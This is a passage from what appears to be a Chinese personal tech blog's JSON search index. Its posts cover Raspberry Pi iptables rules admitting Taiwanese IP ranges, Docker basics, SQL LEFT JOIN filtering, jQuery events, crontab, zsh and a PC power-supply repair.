220.141.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.143.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.64.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.192.0/18 -p tcp --dport 80 -j ACCEPT\n\n\n#emonme ip-prefix\niptables -A INPUT -s 211.79.32.0/20 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 221.120.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 221.120.64.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 116.59.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.136.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.70.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.80.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 223.136.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 42.64.0.0/12 -p tcp --dport 80 -j ACCEPT\n\n\n#ALL INTO 80 port\n#iptables -A INPUT -p tcp --dport 80 -j ACCEPT\n\n#tranmission\niptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 9091  -j ACCEPT\niptables -A INPUT -p tcp --dport 59999:61000 -j ACCEPT\n\n# https 443\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\niptables -A INPUT -j DROP\n```\n\n設定完了\n","tags":["iptables"],"categories":["Linux"]},{"title":"socket的timeout問題","url":"%2Fblog%2F2017%2F09%2F08%2Flogdown%2F2017-09-08-2327309%2F","content":"提醒一下自己，socket會有timeout問題\n最近跟廠商接處，可能這點記錄一下\n\n<!--more-->\n要做blog移轉，筆記先存檔...\n這篇應該不會有實作= =|||","tags":["socket"],"categories":["寫程式一些事"]},{"title":"電腦不明原因，玩遊戲或看影片重開機維修記錄","url":"%2Fblog%2F2017%2F09%2F06%2Flogdown%2F2017-09-06-reasons-unknown-computer-reboot-the-maintenance-records%2F","content":"半年前多，電腦會因為看影片快轉或放大縮小，會重新開機\n我使用Potplayer播放器，有上網搜尋一下\n有找到是顯示卡問題，但後來有更新顯示卡還是一樣\n直到最近...\n(難得寫硬體筆記XD?!)\n<!--more-->\n\n最近玩GTA5玩到一半會重新開機\n一開始我以為是CPU\n因為我CPU是4790k，玩遊戲CPU會超到9x度\n\n不過後來我發現並非90度才會發生這個狀況\n我後來玩GTA5 發現  縮小遊戲後放大後才會這樣\n那時CPU原本待機也才5x度\n不太可能是CPU過熱\n\n我就開始更新主機版 ASUS Z79-Pro 的BIOS\n更新完再測試，還是一樣會重新開機\n但這次有跳出東西\n![Imgur](https://i.imgur.com/QhxPT2S.jpg)\n???\n\nPOWER有問題斷電??因為我POWER是買海韻 G-650   (聽說G650災情多  哀哀)\n聽大廠不容易發生問題才對....，原先排除POWER，改電壓不穩來查\n由於我家常常跳電，我有買一個UPS\n我同學建議我先別插UPS上，直接插在插座\n\n開GTA5還是一樣發生這個狀況，網路上還有說，把BIOS關掉...，一樣還有這個狀況\n(奇怪怎麼有人說關掉可以解決??)\n~~後來就絕望~~\n\n最後我和同學估是CPU過熱或POWER問題\n\n但因為海韻是大廠關係，所以先排除:|\n然後就找4790k CPU風扇\n當下有考慮買水冷\n但因為水冷裝不好可能會造成整台電腦壞掉\n因為哥電腦要撐10年...\n~~在下沒膽~~\n所以我有爬到散塔這個東西\n\nCooler Master Hyper 212X 跟 T40\n 後來網路上爬T40文獻比較多\n https://www.youtube.com/watch?v=AEEmcgUZo7E\n 所以就選T40\n\n最後，T40風扇真的不太好裝，花了2小時時間...\n但測試溫度真的有差\n平時待機T40大概4x度，原廠的約5x度\n玩GTA5 T40大概最高7x度，原廠9x度\n在以為全部都搞定的說\n我玩GTA5玩到一半又重新開機了\n\n\n#~~再次崩潰~~\n\n\n\n後來發現影片快轉也會發生\n>＂Power supply surges detected during the previous power on.\nASUS Anti-Surge was triggered to protect system from unstable power supply unit!\nPress F1 to Run SETUP＂\n\n原來以前就會這樣orz，所以BIOS也還是要更新會比較好\n\n\n在這期間，我還不死心的測試\n有爬到有一個測試工具可以測POWER\n一個叫OCCT，阿榮福利味有免安裝版\nhttp://www.azofreeware.com/2016/05/occt.html\n測試一下，馬上按ON就重新開機\n~~原來死利    虧我這麼相信你~~\n然後測到第三次，電腦會開機就會重開機(連到桌面到不了)PS: SSD開機不到30秒\n\n最後就送修，有找到海韻快修中心\n北部在台灣三重那邊，我有打電話過去問\n他晚上6點就關門了...  六日也休息\n所以我就用值班早上當天去用\n網路上很多人換到不能用\n我後來換回來使用正常\n\n然後開機時顯示卡用YCbCr顏色正常，因為我之前螢幕顏色怪怪\n現在正常了\n\n最後，有簡單的暴力快轉影片放大、縮小，都正常\n用OCCT測試5分鐘後，UPS會叫，後來停止測試又不會叫\n但沒有重新開機了\n(會叫的原因太操???)\n至於GTA5待接下來假日再試啦\n\n筆記就記到這了\n\n結論\n\n# 好的POWER帶你上天堂；壞的POWER帶你下地獄\n\n可以安心睡覺"},{"title":"DB設定常常忘記一此筆記","url":"%2Fblog%2F2017%2F08%2F25%2Flogdown%2F2017-08-25-2214765%2F","content":"在公司學到的東西，但還沒有實作過\n先筆記一下\n\n<!--more-->\n\n要做blog移轉，筆記先存檔...\n刪除主鍵、鎖引鍵，要刪全部資料，才能做刪除動作\n新增主鍵、鎖引鍵，聽說DB10才不用刪資料，就可以新增\n\n","tags":["DB"],"categories":["SQL"]},{"title":"[JS]event.preventDefault和event.stopPropagation","url":"%2Fblog%2F2017%2F08%2F24%2Flogdown%2F2017-08-24-2212154%2F","content":"今天不熟網頁功能同事問我，他對設定用CSS(Bootstrap) disabled樣式\n有沒有辦法讓他不用點\n我立馬寫jQuery使用event.stopPropagation\n結果發現沒有什麼作用\n\n雖然後來網路找到解法，但這個雷記一下XD\n希望下次別再踩到了\n\n<!--more-->\n```js\n$(document).ready(function(){\n    $('a[disabled]').click(function(){\n         event.preventDefault();\n    });\n});\n```\n\n`  event.preventDefault();` 終止預設行為，如上，不會對超連結做跳頁動作\n\n`event.stopPropagation()`終止事件傳遞\n\n希望不要再跳坑一次了XD\n\n題外話：剛剛突然想到jQuery 預設事件是 氣泡事件，但突然想到jQuery怎麼預設 事件補捉\n但...發現jQuery好像沒有事件補捉這個觸發\n\n\n","tags":["stopPropagation"],"categories":["JavaScript"]},{"title":"好懷念leoboard論壇，用docker動手做cgi環境(未完成)","url":"%2Fblog%2F2017%2F08%2F22%2Flogdown%2F2017-08-22-i-really-miss-the-leoboard-forums-with-docker-to-make-cgi-environment%2F","content":"```\n<IfModule !mpm_prefork_module>\n\n        LoadModule cgid_module modules/mod_cgid.so\n\n</IfModule>\n\n<IfModule mpm_prefork_module>\n\n        LoadModule cgi_module modules/mod_cgi.so\n\n</IfModule>\n```\n```\nScriptAlias /cgi-bin/ \"/usr/local/apache/cgi-bin/\" apache\n```\n\n\n```\n[Wed Mar 19 15:40:31.179155 2014] [cgid:error] [pid 4796:tid 140208841959296] (13)Permission denied: AH01241: exec of '/var/cgi-bin/echo.pl' failed\n```\n`chmod +x /var/cgi-bin/echo.pl`\n\nhttp://nohup.cc/article/206/\nhttp://www.cnblogs.com/phpgo/p/5669818.html\nhttps://stackoverflow.com/questions/18392741/apache2-ah01630-client-denied-by-server-configuration","tags":["Docker"],"categories":["Docker"]},{"title":"Docker 新手筆記","url":"%2Fblog%2F2017%2F08%2F20%2Flogdown%2F2017-08-20-2201711%2F","content":"買Docker 入門與實戰，當然要記一下筆記...\n以後開發盡量用Docker做:P\n\n<!--more-->\n\n\n```\ndocker run -it --name linux1 ubuntu\n```\n會執行會開linux bash\n加個`-d`就會背景執行\n\n```\ndocker run -itd --name linux1 ubuntu\n```\n\n要進入shell裡面\n```\ndocker exec -it linux1 /bin/bash\n```\n>當然，大家也可以試試看，如果沒有加 -it ，基本上，只 run 一下，馬上就跳回來了 XDD\n\n>那 -it 是甚麼意思呢，根據官方文件如下。\n-i : Keep STDIN open even if not attached\n-t : Allocate a pseudo-tty\n[Docker - Docker for Windows 10 入門篇 | 天空的垃圾場](https://skychang.github.io/2017/01/06/Docker-Docker_for_Windows_10_First/)\n\n要進入前先確定你的docker container是否有運行，才能進去\n\n```\ndocker ps\n```\n查看運行中的container\n\n(新手常忘XD)查全部的container       [運行+沒運行]\n```\ndocker ps -a\n```\n\n玩了這麼多，要刪掉那麼多測試的container\n有什麼辦法呢XD\n後來有找到\n```\n####################################\n## 小技巧 ##########################\n####################################\n\n# 停止所有的 containers\n$ docker stop $(docker ps -a -q)\n\n# 刪除所有的 containers\n$ docker rm $(docker ps -a -q)\n\n# 刪除所有的 images\n$ docker rmi $(docker images -a -q)\n```\n參考來源：[【Day 3】 - Docker 基本指令操作 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10186431)\n\n>host 與 container 互傳資料\n\n\n>這部分其實跟上面的 Dockerfile 沒甚麼關係，只是剛好可以一併提到，若是建立 container 時沒有使用 **-v** 參數掛載 host 目錄，還是可以用以下的命令可以將資料從 container 中複製出來：\n\n```\n# 其中 python_flask 是 container 名稱\n$ docker cp python_flask:/flask/app.py .\n```\n>當然也可以把 host 資料放進 container 中：\n\n```\n$ touch file_in_host\n\n$ docker cp file_in_host python_flask:/flask\n\n$ docker exec python_flask ls /flask\napp.py\nfile_in_host\n```\n參考來源：https://godleon.github.io/blog/2015/11/27/Docker-Getting-Start-With-Dockerfile\n\n\n## Data Volumes\n以資料夾作為volume\n```\ndocker run -d -P --name web -v /src/webapp:/opt/webapp traning/webapp python app.py\n```\n\n\n## Data Volume Containers\n建立一個資料卷容器，掛載在容器裡面\n```\ndocker run -it -v /dbdata --name dbdata ubuntu\n```\n\n\n`--rm` 跑完container會刪除\n\n\n聽說container關了，裡面資料會不見\n但是我…stop，再打開都還有東西\n後來找到這篇要rm才會沒有東西XD\n\n\n兩個dash，是什麼意思Google一下有找到解答\n[linux shell环境减号”-“的用途 | 等闲之辈莫等闲](http://www.wallcopper.com/linux/588.html)\n\n\n```\ndocker container run  ls -l\n\ndocker container run -it xxx /bin/bash\n\ndocker container ls\n\ndocker container ls -a\n\ndocker image pull xxx\n\n\napt-get update -qq\n```\n\n[Is there a difference between \"docker ps\" and \"docker container ls\"? - Stack Overflow](https://stackoverflow.com/questions/45254677/is-there-a-difference-between-docker-ps-and-docker-container-ls)\n\n差別\n[Docker 1.13 管理命令 - DockOne.io](http://dockone.io/article/2059)\n\n\n\n[PAM-範例 – Benjr.tw](http://benjr.tw/293)\n\n/var/run是做什麼用\n[即将消逝的目录 /var/run](http://blog.ddup.us/2011/04/01/disappearing-var-run-dir/)\n","tags":["Docker"],"categories":["Docker"]},{"title":"anglular隨意筆記","url":"%2Fblog%2F2017%2F08%2F06%2Flogdown%2F2017-08-06-anglular-random-notes%2F","content":"npm install -g @angular/cli\n\n\n\nAngular Language Service\nAngular TypeScript Snippets for VS Code\nPrettier formatter for Visual Studio Code\n\n\nng new coscup\n\nng g c title 建立compent\n\nng g d todo 建立Directive\nhttps://github.com/augt/S02Todo/tree/master/todomvc-template\nhttps://forum.angular.tw/t/coscup-workshop-angular/466/2\nhttps://hackmd.io/p/HJwfMifD-#/6/2\n\n\n\nng generate pipe pipe/my-filer\n\n\nhttp://oomusou.io/angular/angular-coscup-api/\n\n\nng g i post\n\n ng g s services/data"},{"title":"COSCUP2017隨意筆記","url":"%2Fblog%2F2017%2F08%2F05%2Flogdown%2F2017-08-05-coscup-random-notes%2F","content":"\n\nCOSCUP VPS安全維護\n可以iptable設定\nwaf(web application firewall)\nSELinux\n\nssh(SSH) -> ssh(WEB)\nlog記錄到別台去\n\n\napache版本\n\n\nhttps://www.slideshare.net/smalltown20110306/coscup-2017-infrastructure-as-code\nhttp://blog.chengweichen.com/2017/08/coscup-2017-ansible-gitlab-cicd.html","categories":["HTML"]},{"title":"[CSS]flex筆記","url":"%2Fblog%2F2017%2F08%2F03%2Flogdown%2F2017-08-03-cssflex-notes%2F","content":"https://www.facebook.com/WccCasper/videos/414910278905201/\nhttps://paper.dropbox.com/doc/Flex-1lWq76W07m67326psOncP\nhttp://wcc723.github.io/WorkShop-gh-pages/cssFlex/","tags":["flex"],"categories":["CSS"]},{"title":"Crontab排程設定","url":"%2Fblog%2F2017%2F08%2F02%2Flogdown%2F2017-08-02-2131881%2F","content":"最近想自動建立年月份資料夾\n雖然`crontab -e`和`crontab -l`指令還記得\n不過設定都會忘記XD\n再此筆記\n\n<!--more-->\n每季新番我都要在transmission建立資料夾\n建久了就想自動化\n\n首先，先查要怎麼新增當下`年月資料夾`\n我知道Linux的`date`可以看時間\nhttp://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95\n```sh\nmkdir `date \"+%Y%m\"`\n```\n\n`這個就可以了，Ruby也是這樣設定\n\n怎麼使用別的使用者執行呢?\n\n```\n sudo -u debian-transmission crontab -e\n```\n\nhttp://linux.vbird.org/linux_basic/0430cron.php#crontab\n\n重點我每次都會忘Crontab內容怎麼設定XD\n看了設定也有點不安...\n不過我想到Regex都有Online線上測試\n不知道Crontab也有沒有XD\n(之前有悲劇每秒執行程式 囧)\n\n\nhttps://crontab.guru/\nhttp://cron.schlitt.info/\n\n有了這個真的方便多了:P\n\n```\n0 1 1 1,4,7,11 * mkdir `date \"+%Y%m\"`\n```\n\n參考來源：\nhttps://coder.tw/?p=7284\nhttp://linux.vbird.org/linux_basic/0430cron.php#crontab\nhttp://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95","tags":["Crontab"],"categories":["Linux"]},{"title":"zsh前面「使用者@電腦」拿掉","url":"%2Fblog%2F2017%2F07%2F26%2Flogdown%2F2017-07-26-2086815%2F","content":"在.zshrc加入\n```sh\nexport DEFAULT_USER=`whoami`\n```\n完成\n\nubuntu 安裝字型\napt-get install powerline\n\n","tags":["zsh"],"categories":["Linux"]},{"title":"BitBucket的CI簡單測試記錄","url":"%2Fblog%2F2017%2F07%2F24%2Flogdown%2F2017-07-24-2082428%2F","content":"\n原本想使用python的yamllint\n不過使用python的yamllint會有一些問題\n像一行超過80個字  (奇怪...有這個規定??)\n\n後來用node的yamllint就沒問題\n<!--more-->\n\n\n```bitbucket-pipelines.yml\npipelines:\n  default:\n    - step:\n        script: # Modify the commands below to build your repository.\n          - npm install -g yaml-lint\n          - yamllint bitbucket-pipelines.yml\n```\n\n錯誤時候，會發Email通知，成功不會發通知。\n有空再好好研究還能怎麼玩:P\n\n參考來源：\nhttp://ithelp.ithome.com.tw/articles/10187774\nhttp://ithelp.ithome.com.tw/articles/10187137","tags":["BitBucket"],"categories":["CI"]},{"title":"好看的bash工具 -zsh","url":"%2Fblog%2F2017%2F07%2F18%2Flogdown%2F2017-07-18-2067199%2F","content":"之前在MAC看到很多很旋的命令提示字元\n想說Window沒有這個命\n結果今天聽同事說Window也能用\n就馬上試了一下，記錄下來XD\n\n<!--more-->\n\n\n安裝babun，主要裡的zsh是我們要的XD\n安裝完，遇設主題都幫我們裝好了\n輸入`vim ~/.zshrc`\n\n修改\n```\nZSH_THEME=\"agnoster\"\n```\n\n重啟zsh就正常了，什麼zsh亂碼\n\n有試著裝powerline字型都失敗\n後來同事推薦hack字型\n\n修改zsh字型就正常了:D\n\n\n20170724 有些符號還是沒法出來\n後來試了這個，成功出來了！\nhttps://github.com/powerline/fonts/blob/master/DejaVuSansMono/DejaVu%20Sans%20Mono%20for%20Powerline.ttf","tags":["zsh"],"categories":["實用工具"]},{"title":"簡單玩了一下拖拉窗視","url":"%2Fblog%2F2017%2F07%2F16%2Flogdown%2F2017-07-16-2052650%2F","content":"這一篇只是程式記錄，沒有完成非常大的東西...\n\n<!--more-->\n\n最近想手動做個拖拉功能\n不太想用jQuery UI套Dialog上去\n有參考[來做換色與快速整理的便利貼牆吧！](https://www.youtube.com/watch?v=xOAHnDsd2BQ)這個教學方法\n\n不過想自己試試純JS做出來\n後來移動出問題，解不出來\nGoogle一下有看到有人寫一隻\n[多個DIV共用自由移動DIV的程式](http://jsgears.com/thread-693-1-1.html)\n有遇到幾個問題，在此記錄\n\nhttp://jsbin.com/qexuvawolo/edit?js,output\n```javascript=\nvar top1=0,left1=0;\nvar moveFunction = function(event){\n    console.log('x=',event.clientX);\n    console.log('y=',event.clientY);\n    console.log('ox=',event.offsetX);\n    console.log('oy=',event.offsetY);\n    document.getElementById('dialog').style.top =  event.clientY - top1+ \"px\";\n     document.getElementById('dialog').style.left = event.clientX - left1 + \"px\";\n };\n\nvar mousedownFunction = function(event){\n  top1 = event.offsetX;  //event.clientY - obj.offsetTop\n  left1 = event.offsetY; //event.clientX - obj.offsetLeft\n  document.getElementById('dialog').addEventListener('mousemove',moveFunction);\n}\n\ndocument.getElementById('dialog').addEventListener('mousedown',mousedownFunction);\n\n\ndocument.getElementById('dialog').addEventListener('mouseup',function(){\n  document.getElementById('dialog').removeEventListener('mousemove',moveFunction);\n});\n```\nhttp://jsbin.com/qexuvawolo/edit?js,output\n\n1. mousedown記錄點擊位置到物件top,left之間距離\n![](http://i.imgur.com/SfX48vm.png)\n這部份我想了很久，繪了簡單的圖\n\n2. mousemover設定移動位置(新的Event.ClinetX位置-mousedown的left位置)\n\n3. mouseup取消移動的監聽事件\n\n當然我這個method還無法模組化...，有空在把他改的比較好看\n上面找的範例他把document.mousemove做全域使用\n這樣移出body視窗，不會有問題\n\n可能我也要好好想一下，怎麼寫會比較好\n\n----\n\n順便記錄一下別的東西\n![](http://i.imgur.com/1knHfli.jpg)\n\nevent.screenX,event.screenY  從螢幕到event距離\nevent.clientX,event.clientY(event.pageX,event.pageY)  瀏覽器窗口到event距離\nevent.offsetX,event.offsetY    目前物件到event距離\n\n最後，之後再想想做放大縮小要怎麼做:)\n\n","tags":["JavaScript"],"categories":["JavaScript"]},{"title":"SQL ON /WHERE差別","url":"%2Fblog%2F2017%2F07%2F13%2Flogdown%2F2017-07-13-2043738%2F","content":"\n最近在 left join 使用 on 做篩選\n結果出來跟我想要的不太一樣\n後來有爬文找到原因\n\n<!--more-->\n\n```sql\nfrom a left join b on a.id=b.id and b.word = 'xxxx'\n```\n\n結果跑出來東西是多筆\n\n> 其實以上結果的關鍵原因就是 left join,right join,full join 的特殊性，不管 on 上的條件是否為真都會返回 left 或 right 表中的記錄，full 則具有 left 和 right 的特性的並集。 而 inner join 沒這個特殊性，則條件放在 on 中和 where 中，返回的結果集是相同的。\n> http://blog.sina.com.cn/s/blog_6826662b0101atu1.html\n\nhttp://louis176127.pixnet.net/blog/post/186150706-sql-%E6%A2%9D%E4%BB%B6%E5%BC%8F%E5%AF%AB%E5%9C%A8on%E4%BB%A5%E5%8F%8Awhere%E7%9A%84%E5%B7%AE%E5%88%A5\n\n**2018-12-24**\n子查詢 join 無法抓到外面的表\n[終於知道為什麼子查詢沒辦法抓取外面的表 | 程式狂想筆記](https://malagege.github.io/blog/2018/12/24/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/)\n\n**2018-12-25**\n\n```sql\nSELECT\n                      xxx,ooo\n                    FROM table1 ous\n                      LEFT JOIN table2 vc\n                        ON  vc.user_id = 'dddddd'\n                        AND vc.type = 'ADD'\n                        AND vc.cancel IS NULL\nAND DATE_FORMAT(vc.end_date, '%Y-%m-%d') >= DATE_FORMAT('2018-01-01', '%Y-%m-%d') AND DATE_FORMAT(START_DATE, '%Y-%m-%d') < DATE_FORMAT('2018-11-02' , '%Y-%m-%d')\n                    WHERE  ous.uid = 'dddddd'\n\n                    ORDER BY vc.sid DESC LIMIT 1\n```\n\n移至 WHERE 結果是不一樣的!!!\n因為是 LEFT JOIN\n所以 ous 不管做甚麼條件，都不會消失\nvc 會變成 null\n\n```sql\nSELECT\n                      xxx,ooo\n                    FROM table1 ous\n                      LEFT JOIN table2 vc\n                        ON  vc.user_id = 'dddddd'\n                        AND vc.type = 'ADD'\n                        AND vc.cancel IS NULL\n                    WHERE  ous.uid = 'dddddd'\nAND DATE_FORMAT(vc.end_date, '%Y-%m-%d') >= DATE_FORMAT('2018-01-01', '%Y-%m-%d') AND DATE_FORMAT(START_DATE, '%Y-%m-%d') < DATE_FORMAT('2018-11-02' , '%Y-%m-%d')\n\n                    ORDER BY vc.sid DESC LIMIT 1\n```\n\n要改成\n\n```sql\nSELECT\n                      xxx,ooo\n                    FROM table1 ous\n                      LEFT JOIN table2 vc\n                        ON  vc.user_id = 'dddddd'\n                        AND vc.type = 'ADD'\n                        AND vc.cancel IS NULL\n                    WHERE  ous.uid = 'dddddd'\nOR (  ous.uid = 'dddddd' AND DATE_FORMAT(vc.end_date, '%Y-%m-%d') >= DATE_FORMAT('2018-01-01', '%Y-%m-%d') AND DATE_FORMAT(START_DATE, '%Y-%m-%d') < DATE_FORMAT('2018-11-02' , '%Y-%m-%d'))\n\n                    ORDER BY vc.sid DESC LIMIT 1\n```\n","tags":["sql"],"categories":["SQL"]},{"title":"SQL好文分享 - 十步完全理解 SQL","url":"%2Fblog%2F2017%2F07%2F10%2Flogdown%2F2017-07-10-sql-fine-literature-ten-steps-to-fully-understand-the-sql%2F","content":"今天找SQL 的IN ,EXISTS,=ANY差別找到這篇文章 [十步完全理解 SQL](http://blog.jobbole.com/48369/)\n看了覺得該簡討一下\n\n<!--more-->\n```sql\nselect a as named_column\nfrom a_form\nwhere named_column = 'c'\n```\n\n為什麼不能這樣用呢?\n我之前聽到的是where抓不到這一層的\n要再包一層才抓的到\n\n```sql\nselect named_column\n(select a as named_column\nfrom a_form\n)\nwhere named_column = 'c'\n```\n\n直到我看到`2、 SQL 的语法并不按照语法顺序执行`\n覺得我最基礎關念沒搞清楚(差點要跪鍵盤了....)\n\n這篇文章真的不錯，值得我記錄\n不過文章禁止轉載\n>本文由 伯乐在线 - 水果泡腾片 翻译。未经许可，禁止转载！\n英文出处： Lukas Eder 。欢迎加入翻译组。\nhttp://blog.jobbole.com/55086/\n\n在此記錄筆記\n\n這篇看起來也不錯:P\nhttp://blog.jobbole.com/48369/","tags":["sql"],"categories":["SQL"]},{"title":"Raspberry PI 防火牆設定iptables","url":"%2Fblog%2F2017%2F07%2F09%2Flogdown%2F2017-07-09-raspberry-pi-set-firewall-iptables%2F","content":"我的動物機設定，因為公司要報告\n我使用reveal-md來報告\n需要連回家裡電腦設定\n因為之前沒有做記錄\n就閱在做一下嘍:)\n<!--more-->\n非中華電信網路封鎖\n\n```iptables.sh\niptables -F  //清除所有的已訂定的規則；\niptables -P INPUT DROP  //進來的封包全擋\niptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n# 選項與參數：\n# -m ：一些 iptables 的外掛模組，主要常見的有：\n#      state ：狀態模組\n#      mac   ：網路卡硬體位址 (hardware address)\n# --state ：一些封包的狀態，主要有：\n#      INVALID    ：無效的封包，例如資料破損的封包狀態\n#      ESTABLISHED：已經連線成功的連線狀態；\n#      NEW        ：想要新建立連線的封包狀態；\n#      RELATED    ：這個最常用！表示這個封包是與我們主機發送出去的封包有關\niptables -A INPUT -s 192.168.1.0/24 -j ACCEPT //內網192.168.1.0網域可以進來\niptables -A INPUT -i lo -j ACCEPT //localhost可以連  -i interface\n\n#iptables -A INPUT -p tcp –dport 80 -j ACCEPT  //全部可以連\n\n#taiwan ip input http:80\niptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 1.160.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.224.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.70.239.0/24 -p tcp --dport 80 -j ACCEPT\n\n\n#3 ip-prefix split\niptables -A INPUT -s 202.39.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 202.39.64.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.129.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.137.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.141.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.143.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.64.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.192.0/18 -p tcp --dport 80 -j ACCEPT\n\n\n#emonme ip-prefix\niptables -A INPUT -s 211.79.32.0/20 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 221.120.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 221.120.64.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 116.59.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.136.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.70.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.80.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 223.136.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 42.64.0.0/12 -p tcp 